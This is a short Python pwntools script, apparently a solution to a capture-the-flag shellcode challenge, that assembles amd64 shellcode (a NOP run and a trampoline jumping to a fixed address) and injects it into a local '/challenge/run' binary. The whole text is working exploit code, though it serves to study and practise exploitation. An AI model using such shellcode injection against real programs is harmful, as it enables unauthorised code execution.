import pwn
pwn.context.update(arch="amd64", os="linux")
code = pwn.asm("""
.intel_syntax noprefix
.global _start
_start:
jmp trampoline
.rept 0x51
nop 
.endr
trampoline :
pop rdi
mov rax, 0x403000
jmp rax
""")
process = pwn.process("/challenge/run")
process.send(code)
print(process.recvall().decode())